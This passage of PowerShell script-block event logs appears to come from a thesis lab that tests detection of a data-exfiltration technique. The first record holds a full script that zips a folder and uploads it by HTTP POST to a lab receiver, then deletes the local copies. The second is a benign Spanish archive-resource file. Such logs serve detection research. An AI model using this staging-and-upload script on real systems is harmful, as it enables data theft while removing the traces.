$copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n","ScriptBlockId":"622fc977-93d2-4ba5-b172-df52bf57b8a9","Path":"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1"},"Message":"Creando texto de bloque de script (1 de 1):\n# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.\n# This script uses only dummy lab data and does not require credentials.\n\nparam(\n    [Alias(\"SourcePath\")]\n    [string]$WorkDir = \"\",\n\n    [Alias(\"StagingPath\")]\n    [string]$OutputDir = \"\",\n\n    [string]$ReceiverUrl = \"http://192.168.56.1:8000/upload\",\n    [switch]$EnableUpload,\n    [int]$TimeoutSec = 30,\n    [string]$ZipName = \"tec009_controlled_archive.zip\",\n    [switch]$KeepArtifacts\n)\n\nSet-StrictMode -Version Latest\n$ErrorActionPreference = \"Stop\"\n\n$BasePath = $env:TFM_BASEPATH\nif ([string]::IsNullOrWhiteSpace($BasePath)) {\n    $BasePath = \"C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\"\n}\n$env:TFM_BASEPATH = $BasePath\n\nif ([string]::IsNullOrWhiteSpace($WorkDir)) {\n    $WorkDir = Join-Path $BasePath \"DUMB_LAB\"\n}\nif ([string]::IsNullOrWhiteSpace($OutputDir)) {\n    $OutputDir = Join-Path $BasePath \"TEC-009_Exfiltracion\\staging_controlled\"\n}\nif (-not $ZipName.ToLowerInvariant().EndsWith(\".zip\")) {\n    $ZipName = \"$ZipName.zip\"\n}\n\nif (-not (Test-Path -LiteralPath $WorkDir)) {\n    throw \"WorkDir does not exist: $WorkDir\"\n}\n\nNew-Item -ItemType Directory -Force -Path $OutputDir | Out-Null\n\n$zipFile = Join-Path $OutputDir $ZipName\n$copyName = \"{0}_copy{1}\" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)\n$copyFile = Join-Path $OutputDir $copyName\n$summaryFile = Join-Path $OutputDir \"tec009_transfer_summary.json\"\n\nRemove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\nRemove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue\n\nCompress-Archive -Path (Join-Path $WorkDir \"*\") -DestinationPath $zipFile -Force\nCopy-Item -LiteralPath $zipFile -Destination $copyFile -Force\n\n$zipItem = Get-Item -LiteralPath $zipFile\n$copyItem = Get-Item -LiteralPath $copyFile\n$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()\n\n$httpStatusCode = $null\n$uploadSucceeded = $false\n$uploadError = \"\"\n$receiverResponse = \"\"\n\nif ($EnableUpload.IsPresent) {\n    try {\n        $response = Invoke-WebRequest `\n            -Uri $ReceiverUrl `\n            -Method POST `\n            -InFile $zipFile `\n            -ContentType \"application/zip\" `\n            -UserAgent \"TFM-TEC009-ControlledUpload/3.0\" `\n            -TimeoutSec $TimeoutSec `\n            -UseBasicParsing\n\n        $httpStatusCode = [int]$response.StatusCode\n        $receiverResponse = [string]$response.Content\n        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)\n    }\n    catch {\n        $uploadError = $_.Exception.Message\n        Write-Warning (\"Controlled upload failed: {0}\" -f $uploadError)\n    }\n}\nelse {\n    $uploadError = \"Upload disabled by parameter.\"\n}\n\n$summary = [ordered]@{\n    Timestamp = (Get-Date).ToString(\"o\")\n    WorkDir = $WorkDir\n    OutputDir = $OutputDir\n    ZipFile = $zipFile\n    CopyFile = $copyFile\n    ZipBytes = $zipItem.Length\n    CopyBytes = $copyItem.Length\n    LocalSHA256 = $localHash\n    ReceiverUrl = $ReceiverUrl\n    EnableUpload = [bool]$EnableUpload\n    TimeoutSec = $TimeoutSec\n    HttpStatusCode = $httpStatusCode\n    UploadSucceeded = $uploadSucceeded\n    UploadError = $uploadError\n    ReceiverResponse = $receiverResponse\n    KeepArtifacts = [bool]$KeepArtifacts\n}\n\n$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8\n\nWrite-Host \"Controlled staging/archive completed.\"\nWrite-Host \"ZIP created: $zipFile\"\nWrite-Host \"ZIP copy created: $copyFile\"\nWrite-Host \"ZIP bytes: $($zipItem.Length)\"\nWrite-Host \"ZIP SHA256: $localHash\"\nWrite-Host \"Receiver URL: $ReceiverUrl\"\nWrite-Host \"Upload enabled: $([bool]$EnableUpload)\"\nWrite-Host \"HTTP status: $httpStatusCode\"\nWrite-Host \"Upload succeeded: $uploadSucceeded\"\nWrite-Host \"Summary: $summaryFile\"\n\nif (-not $KeepArtifacts.IsPresent) {\n    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue\n    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue\n    Write-Host \"Local ZIP artifacts removed because KeepArtifacts=false.\"\n}\n\nif ($EnableUpload.IsPresent -and -not $uploadSucceeded) {\n    exit 2\n}\n\n\nId. de bloque de script: 622fc977-93d2-4ba5-b172-df52bf57b8a9\nRuta de acceso: C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\exfiltracion_v3.ps1\r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
{"Timestamp":"2026-07-12T13:29:21.032649517Z","Computer":"LT29.ait.us.es","Channel":"Microsoft-Windows-PowerShell/Operational","EID":4104,"Level":"informational","Title":"PwSh Scriptblock","RecordID":3287664,"Details":"ScriptBlock: # Localized\t12/07/2019 11:46 AM (GMT)\t303:6.40.20520 \tArchiveResources.psd1\r\n# Localized ArchiveResources.psd1\r\n\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nPathNotFoundError=La ruta de acceso \"{0}\" no existe o no es una ruta de acceso válida del sistema de archivos.\r\nExpandArchiveInValidDestinationPath=La ruta de acceso '{0}' no es una ruta de acceso de directorio de sistema de archivos válida.\r\nInvalidZipFileExtensionError={0} no es un formato de archivo de almacenamiento compatible. {1} es el único formato de archivo de almacenamiento admitido.\r\nArchiveFileIsReadOnly=Los atributos del archivo de almacenamiento {0} se han establecido en solo lectura, por lo que no se pueden actualizar. Para actualizar el archivo de almacenamiento existente, quita el atributo de solo lectura del archivo de almacenamiento, o bien usa el parámetro -Force para invalidar el atributo y crear un nuevo archivo de almacenamiento.\r\nZipFileExistError=El archivo de almacenamiento {0} ya existe. Usa el parámetro -Update para actualizar el archivo de almacenamiento, o bien usa el parámetro -Force para sobrescribir el archivo de almacenamiento existente.\r\nDuplicatePathFoundError=La entrada del parámetro {0} contiene un ruta de acceso duplicada '{1}'. Proporcione un conjunto único de rutas de acceso como entrada del parámetro {2}.\r\nArchiveFileIsEmpty=El archivo de almacenamiento {0} está vacío.\r\nCompressProgressBarText=La creación del archivo de almacenamiento '{0}' está en curso...\r\nExpandProgressBarText=La expansión del archivo de almacenamiento '{0}' está en curso...\r\nAppendArchiveFileExtensionMessage=La ruta de acceso del archivo de almacenamiento '{0}' especificada para el parámetro DestinationPath no incluye la extensión .zip. Por tanto, .zip se ha anexado a la ruta de acceso de DestinationPath especificada y el archivo de almacenamiento se creará en '{1}'.\r\nAddItemtoArchiveFile=Agregando '{0}'.\r\nBadArchiveEntry=No se puede procesar la entrada de archivo \"{0}\", que no es válida.\r\nCreateFileAtExpandedPath=Se ha creado '{0}'.\r\nInvalidArchiveFilePathError=La ruta de acceso del archivo de almacenamiento '{0}' especificada como entrada del parámetro {1} se resuelve en varias rutas de acceso del sistema de archivos. Proporcione una ruta de acceso única al parámetro {2} donde se debe crear el archivo de almacenamiento.\r\nInvalidExpandedDirPathError=La ruta de acceso del directorio '{0}' especificada como entrada del parámetro DestinationPath se resuelve en varias rutas de acceso del sistema de archivos. Proporcione una ruta de acceso única al parámetro Destination donde se debe expandir el contenido del archivo de almacenamiento.\r\nFileExistsError=No se pudo crear el archivo '{0}' al expandir el contenido del archivo de almacenamiento '{1}', porque el archivo '{2}' ya existe. Use el parámetro -Force si desea sobrescribir el contenido del directorio '{3}' existente al expandir el archivo de almacenamiento.\r\nDeleteArchiveFile=El archivo de almacenamiento creado parcialmente '{0}' se ha eliminado porque no se puede usar.\r\nInvalidDestinationPath=La ruta de acceso de destino \"{0}\" no contiene un nombre de archivo de almacenamiento válido.\r\nPreparingToCompressVerboseMessage=Preparando para comprimir...\r\nPreparingToExpandVerboseMessage=Preparando para expandir...\r\n###PSLOC\r\n'@\r\n","_Event":{"System":{"Provider":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":{"Value":4104},"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":0,"TimeCreated":{"SystemTime":1783862961.0326495},"EventRecordID":3287664,"Correlation":{"ActivityID":"F2694954-11F0-0003-B022-6FF2F011DD01"},"Execution":{"ProcessID":4956,"ThreadID":12076},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"LT29.ait.us.es","Security":{"UserID":"S-1-5-21-2237245112-686140129-944090608-1004"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"# Localized\t12/07/2019 11:46 AM (GMT)\t303:6.40.20520 \tArchiveResources.psd1\r\n# Localized ArchiveResources.psd1\r\n\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nPathNotFoundError=La ruta de acceso \"{0}\" no existe o no es una ruta de acceso válida del sistema de archivos.\r\nExpandArchiveInValidDestinationPath=La ruta de acceso '{0}' no es una ruta de acceso de directorio de sistema de archivos válida.\r\nInvalidZipFileExtensionError={0} no es un formato de archivo de almacenamiento compatible. {1} es el único formato de archivo de almacenamiento admitido.\r\nArchiveFileIsReadOnly=Los atributos del archivo de almacenamiento {0} se han establecido en solo lectura, por lo que no se pueden actualizar. Para actualizar el archivo de almacenamiento existente, quita el atributo de solo lectura del archivo de almacenamiento, o bien usa el parámetro -Force para invalidar el atributo y crear un nuevo archivo de almacenamiento.\r\nZipFileExistError=El archivo de almacenamiento {0} ya existe. Usa el parámetro -Update para actualizar el archivo de almacenamiento, o bien usa el parámetro -Force para sobrescribir el archivo de almacenamiento existente.\r\nDuplicatePathFoundError=La entrada del parámetro {0} contiene un ruta de acceso duplicada '{1}'. Proporcione un conjunto único de rutas de acceso como entrada del parámetro {2}.\r\nArchiveFileIsEmpty=El archivo de almacenamiento {0} está vacío.\r\nCompressProgressBarText=La creación del archivo de almacenamiento '{0}' está en curso...\r\nExpandProgressBarText=La expansión del archivo de almacenamiento '{0}' está en curso...\r\nAppendArchiveFileExtensionMessage=La ruta de acceso del archivo de almacenamiento '{0}' especificada para el parámetro DestinationPath no incluye la extensión .zip. Por tanto, .zip se ha anexado a la ruta de acceso de DestinationPath especificada y el archivo de almacenamiento se creará en '{1}'.\r\nAddItemtoArchiveFile=Agregando '{0}'.\r\nBadArchiveEntry=No se puede procesar la entrada de archivo \"{0}\", que no es válida.\r\nCreateFileAtExpandedPath=Se ha creado '{0}'.\r\nInvalidArchiveFilePathError=La ruta de acceso del archivo de almacenamiento '{0}' especificada como entrada del parámetro {1} se resuelve en varias rutas de acceso del sistema de archivos. Proporcione una ruta de acceso única al parámetro {2} donde se debe crear el archivo de almacenamiento.\r\nInvalidExpandedDirPathError=La ruta de acceso del directorio '{0}' especificada como entrada del parámetro DestinationPath se resuelve en varias rutas de acceso del sistema de archivos. Proporcione una ruta de acceso única al parámetro Destination donde se debe expandir el contenido del archivo de almacenamiento.\r\nFileExistsError=No se pudo crear el archivo '{0}' al expandir el contenido del archivo de almacenamiento '{1}', porque el archivo '{2}' ya existe. Use el parámetro -Force si desea sobrescribir el contenido del directorio '{3}' existente al expandir el archivo de almacenamiento.\r\nDeleteArchiveFile=El archivo de almacenamiento creado parcialmente '{0}' se ha eliminado porque no se puede usar.\r\nInvalidDestinationPath=La ruta de acceso de destino \"{0}\" no contiene un nombre de archivo de almacenamiento válido.\r\nPreparingToCompressVerboseMessage=Preparando para comprimir...\r\nPreparingToExpandVerboseMessage=Preparando para expandir...\r\n###PSLOC\r\n'@\r\n","ScriptBlockId":"c97665b0-6067-4457-a558-b47da3a5d2a2","Path":""},"Message":"Creando texto de bloque de script (1 de 1):\n# Localized\t12/07/2019 11:46 AM (GMT)\t303:6.40.20520 \tArchiveResources.psd1\r\n# Localized ArchiveResources.psd1\r\n\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nPathNotFoundError=La ruta de acceso \"{0}\" no existe o no es una ruta de acceso válida del sistema de archivos.\r\nExpandArchiveInValidDestinationPath=La ruta de acceso '{0}' no es una ruta de acceso de directorio de sistema de archivos válida.\r\nInvalidZipFileExtensionError={0} no es un formato de archivo de almacenamiento compatible. {1} es el único formato de archivo de almacenamiento admitido.\r\nArchiveFileIsReadOnly=Los atributos del archivo de almacenamiento {0} se han establecido en solo lectura, por lo que no se pueden actualizar. Para actualizar el archivo de almacenamiento existente, quita el atributo de solo lectura del archivo de almacenamiento, o bien usa el parámetro -Force para invalidar el atributo y crear un nuevo archivo de almacenamiento.\r\nZipFileExistError=El archivo de almacenamiento {0} ya existe. Usa el parámetro -Update para actualizar el archivo de almacenamiento, o bien usa el parámetro -Force para sobrescribir el archivo de almacenamiento existente.\r\nDuplicatePathFoundError=La entrada del parámetro {0} contiene un ruta de acceso duplicada '{1}'. Proporcione un conjunto único de rutas de acceso como entrada del parámetro {2}.\r\nArchiveFileIsEmpty=El archivo de almacenamiento {0} está vacío.\r\nCompressProgressBarText=La creación del archivo de almacenamiento '{0}' está en curso...\r\nExpandProgressBarText=La expansión del archivo de almacenamiento '{0}' está en curso...\r\nAppendArchiveFileExtensionMessage=La ruta de acceso del archivo de almacenamiento '{0}' especificada para el parámetro DestinationPath no incluye la extensión .zip. Por tanto, .zip se ha anexado a la ruta de acceso de DestinationPath especificada y el archivo de almacenamiento se creará en '{1}'.\r\nAddItemtoArchiveFile=Agregando '{0}'.\r\nBadArchiveEntry=No se puede procesar la entrada de archivo \"{0}\", que no es válida.\r\nCreateFileAtExpandedPath=Se ha creado '{0}'.\r\nInvalidArchiveFilePathError=La ruta de acceso del archivo de almacenamiento '{0}' especificada como entrada del parámetro {1} se resuelve en varias rutas de acceso del sistema de archivos. Proporcione una ruta de acceso única al parámetro {2} donde se debe crear el archivo de almacenamiento.\r\nInvalidExpandedDirPathError=La ruta de acceso del directorio '{0}' especificada como entrada del parámetro DestinationPath se resuelve en varias rutas de acceso del sistema de archivos. Proporcione una ruta de acceso única al parámetro Destination donde se debe expandir el contenido del archivo de almacenamiento.\r\nFileExistsError=No se pudo crear el archivo '{0}' al expandir el contenido del archivo de almacenamiento '{1}', porque el archivo '{2}' ya existe. Use el parámetro -Force si desea sobrescribir el contenido del directorio '{3}' existente al expandir el archivo de almacenamiento.\r\nDeleteArchiveFile=El archivo de almacenamiento creado parcialmente '{0}' se ha eliminado porque no se puede usar.\r\nInvalidDestinationPath=La ruta de acceso de destino \"{0}\" no contiene un nombre de archivo de almacenamiento válido.\r\nPreparingToCompressVerboseMessage=Preparando para comprimir...\r\nPreparingToExpandVerboseMessage=Preparando para expandir...\r\n###PSLOC\r\n'@\r\n\n\nId. de bloque de script: c97665b0-6067-4457-a558-b47da3a5d2a2\nRuta de acceso: \r\n"},"_Source":"Windows.Sigma.BaseEvents","ClientId":"C.364907172793f8c7","_ts":1783863135483}
